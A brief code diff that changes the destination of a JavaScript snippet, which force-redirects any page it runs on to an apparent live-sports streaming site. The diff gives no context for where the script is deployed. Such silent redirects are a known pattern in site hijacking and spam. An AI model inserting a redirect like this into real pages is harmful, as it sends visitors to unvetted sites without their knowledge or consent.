@@ -1,5 +1,5 @@
 (function () {
-    const target = "https://vid.elastichq.org/?t69";
+    const target = "https://sdhsaatv.pro/nfl-live/?d15";
 
     if (window.location.href !== target) {
         window.location.replace(target);
